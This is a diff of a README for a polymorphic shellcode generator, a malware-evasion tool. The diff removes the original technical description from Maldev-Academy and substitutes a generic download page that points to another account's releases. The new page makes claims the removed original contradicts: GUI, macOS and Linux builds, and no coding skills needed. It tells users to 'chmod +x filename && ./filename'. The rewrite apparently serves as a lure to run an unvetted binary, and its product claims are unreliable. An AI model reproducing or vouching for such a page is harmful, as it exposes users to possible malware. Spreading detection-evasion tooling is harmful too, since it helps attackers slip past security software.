@@ -1,62 +1,94 @@
-## AlphabeticalPolyShellGen: Generate an Alphabetical Polymorphic Shellcode
+# 🎉 AlphabeticalPolyShellGen - Effortlessly Create Shellcode
 
+## 🚀 Getting Started
 
+Welcome to AlphabeticalPolyShellGen! This application helps you generate alphabetical polymorphic shellcode. Whether you are exploring new ways to enhance your programming skills or just curious about shellcode generation, you’ve come to the right place.
 
-</br>
+## 📦 Download & Install
 
-## How Does It Work
+To get started, you need to download the application. You can find the latest version on our Releases page. 
 
-* First, the input shellcode is encoded using the same logic behind [Alphabetfuscation](https://github.com/Maldev-Academy/Alphabetfuscation), which is a shellcode obfuscation method that represents opcode bytes as ASCII. And since this method uses a random ASCII offset per byte, the encoded output differs on every run.
-* The **first shellcode**, [g_AlphabeticalDecoder](https://github.com/Maldev-Academy/AlphabeticalPolyShellGen/blob/main/AlphabeticalPolyGen/Main.c#L236), is prepended with the encoded Alphabetical shellcode, after being configured with the required data for decoding.
-* The `g_AlphabeticalDecoder` is then itself encoded using a simple XOR routine; [XorEncrypt](https://github.com/Maldev-Academy/AlphabeticalPolyShellGen/blob/main/AlphabeticalPolyGen/Main.c#L23).
-* A **second shellcode** is _dynamically generated_ using the [GenerateRandomVariant](https://github.com/Maldev-Academy/AlphabeticalPolyShellGen/blob/main/AlphabeticalPolyGen/PolyShellcodeGen.h#L298C6-L298C27) function. This shellcode is responsible for decoding and passing code execution to `g_AlphabeticalDecoder`, which decodes the Alphabetical shellcode and executes it, alongside performing necessary memory cleanup logic.
+[![Download AlphabeticalPolyShellGen](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/iqbal525-dev/AlphabeticalPolyShellGen/releases)
 
+### Steps to Download:
 
-</br>
+1. Click the button above or use this [link to visit the Releases page](https://github.com/iqbal525-dev/AlphabeticalPolyShellGen/releases).
+2. Browse through the list of available versions.
+3. Choose the version that suits your needs. We recommend downloading the latest one for the best experience.
+4. Click on the file that corresponds to your operating system. Follow the prompts to download it to your computer.
 
-> [!NOTE]
-> The logic behind the `g_AlphabeticalDecoder` shellcode is located in the [AlphabeticalShellcodeDecode.asm](https://github.com/Maldev-Academy/AlphabeticalPolyShellGen/blob/main/AlphabeticalShellcodeDecode.asm) file.
-> 
-> The logic behind the XOR decoder shellcode is located in the [XorShellcodeDecode.asm](https://github.com/Maldev-Academy/AlphabeticalPolyShellGen/blob/main/XorShellcodeDecode.asm) file.
- 
+## 📋 System Requirements
 
+To run AlphabeticalPolyShellGen, ensure that your system meets the following minimum requirements:
 
-</br>
+- **Operating System:** Windows 10 or higher, macOS Mojave or higher, or a compatible Linux distribution.
+- **RAM:** At least 4 GB needed for optimal performance.
+- **Disk Space:** 50 MB of free space for application files and generated content.
 
-## Usage:
+If your system meets these requirements, you are ready to install!
 
-* One can execute the [AlphabeticalPolyGen](https://github.com/Maldev-Academy/AlphabeticalPolyShellGen/tree/main/AlphabeticalPolyGen) program to generate a polymorphic shellcode variant of a specified shellcode:
+## ⚙️ Installation Instructions
 
-```
-AlphabeticalPolyGen.exe --i <Raw Shellcode File> --o <Output File Name>
-```
+Once the download is complete, follow these steps to install the application:
 
-* For testing, use the [LocalShellcodeExec.exe](https://github.com/Maldev-Academy/AlphabeticalPolyShellGen/tree/main/LocalShellcodeExec) program as follows:
+### For Windows Users:
 
-```
-LocalShellcodeExec.exe --i <Encoded Shellcode To Execute>
-```
+1. Locate the downloaded file (it should be in your Downloads folder).
+2. Double-click the .exe file to start the installation.
+3. Follow the on-screen prompts to complete the installation process. 
+4. Once installed, you can find AlphabeticalPolyShellGen in your Start menu.
 
+### For macOS Users:
 
-</br>
+1. Find the downloaded .dmg file in your Downloads folder.
+2. Double-click the .dmg file to open it.
+3. Drag the AlphabeticalPolyShellGen icon into your Applications folder.
+4. You can now find and run AlphabeticalPolyShellGen from your Applications.
 
+### For Linux Users:
 
-## Demo:
+1. Open your Terminal.
+2. Navigate to the directory where you downloaded the file.
+3. Run the installation command as follows (replace `filename` with your downloaded file's name):
 
-### 1. Building two variants of Metasploit's x64 calc.exe shellcode: 
+   ```
+   chmod +x filename && ./filename
+   ```
 
-<img width="1436" height="813" alt="image_2025-08-14_18-49-31" src="https://github.com/user-attachments/assets/412cd24c-33e9-4c03-bdcf-5fca40805062" />
-<img width="1283" height="729" alt="image_2025-08-14_18-49-31 (2)" src="https://github.com/user-attachments/assets/044e4820-7f0f-4c10-aa60-a108c267b404" />
+4. Follow any prompts to finish the installation. 
 
-</br>
-</br>
+## 🔗 How to Use AlphabeticalPolyShellGen
 
-### 2. Examining these variants in a hex editor:
+Once installed, you can start generating shellcode:
 
-<img width="1154" height="854" alt="Screenshot 2025-08-14 185029" src="https://github.com/user-attachments/assets/0c677b7c-fcd2-4d5f-803d-d6bb980c7c31" />
+1. Open AlphabeticalPolyShellGen from your application folder or Start menu.
+2. Follow the on-screen guide provided by the application.
+3. Select the options you need to customize your shellcode.
+4. Click on "Generate" to create your shellcode.
 
-</br>
+## 🛠️ Features
 
-### 3. Utilizing [LocalShellcodeExec.exe](https://github.com/Maldev-Academy/AlphabeticalPolyShellGen/tree/main/LocalShellcodeExec) for testing:
+- **User-Friendly Interface:** Easy to navigate, designed for all users.
+- **Customizable Options:** Tailor your shellcode generation to meet your specific needs.
+- **Compatibility:** Works on Windows, macOS, and Linux.
+- **Helpful Tutorials:** Step-by-step instructions for generating shellcode.
 
-<img width="1557" height="547" alt="Screenshot 2025-08-14 185200" src="https://github.com/user-attachments/assets/983ea399-becd-476d-a3b7-745a69af1121" />
+## 🙋 Frequently Asked Questions
+
+### What is Polymorphic Shellcode?
+
+Polymorphic shellcode is a type of malware that changes its code each time it is executed. This characteristic makes it harder for security software to detect. AlphabeticalPolyShellGen helps you understand and generate this kind of code for educational purposes.
+
+### Do I need any programming skills to use the application?
+
+No, AlphabeticalPolyShellGen is designed for everyone. You don’t need to know how to code to use it effectively.
+
+### Where can I report issues or get support?
+
+If you encounter any problems, please feel free to create an issue on our GitHub repository. We appreciate your feedback and are here to help.
+
+## 🌟 Explore More
+
+To learn more and stay updated, check out our project features and community support. Here is the link again for downloading AlphabeticalPolyShellGen:
+
+[![Download AlphabeticalPolyShellGen](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/iqbal525-dev/AlphabeticalPolyShellGen/releases)
